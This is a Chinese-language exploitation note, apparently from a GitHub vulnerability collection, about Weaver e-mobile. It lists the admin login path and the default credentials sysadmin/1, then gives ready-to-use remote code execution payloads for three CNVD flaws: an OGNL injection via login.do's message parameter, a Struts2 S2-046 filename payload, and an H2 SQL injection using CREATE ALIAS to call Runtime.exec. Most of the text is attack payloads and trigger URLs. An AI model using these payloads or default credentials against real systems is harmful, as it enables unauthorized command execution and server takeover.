前置基础
---


相关漏洞
---
### 后台 & 默认账号密码

- 后台地址
```
/manager/login.do
```
- 默认账号密码
e-mobile常搭配e-cology使用、系统管理员即为e-cology的默认管理员
```
sysadmin/1
```

### CNVD-2017-03561 login.do OGNL 表达式注入漏洞

已测试版本
```
v6.5
v5.5
```

触发点
- /login.do?message=${}
- /manager/login.do?message=${}

回显

```java
message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami
```

测试效果

![image](https://user-images.githubusercontent.com/55024146/157926046-e10965ef-4eef-4a87-8105-cfcf7849437c.png)



### CNVD-2017-07285 S2-046 (S2系列)

已测试版本
```
v5
```

S2系列漏洞

![image](https://user-images.githubusercontent.com/55024146/157924785-3104e738-e0ad-4695-874d-43b5bb675fa4.png)

回显
```
filename="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```
测试效果(S2-046)

![image](https://user-images.githubusercontent.com/55024146/157925660-8eb25fbb-8634-491f-bcf8-6181f5686686.png)





### CNVD-2021-25287 SQLi to RCE (messageType.do & client.do)

已测试版本
```
v6.6
```

内置H2数据库，可以利用alias别名，调用java代码达到命令执行的效果


```java
CREATE ALIAS EXEC AS
$$ void e(String cmd) throws java.io.IOException
{java.lang.Runtime rt= java.lang.Runtime.getRuntime();rt.exec(cmd);}$$
CALL EXEC('whoami');
```

测试效果
- messageType.do

<img src="https://user-images.githubusercontent.com/55024146/157912369-ff97664d-b31c-4d45-8643-20b3e40db74d.png" style="zoom:33%;" />



- client.do

<img src="https://user-images.githubusercontent.com/55024146/157912285-08fb69ee-c055-4935-afb5-d6fcf6d54dbe.png" style="zoom:33%;" />








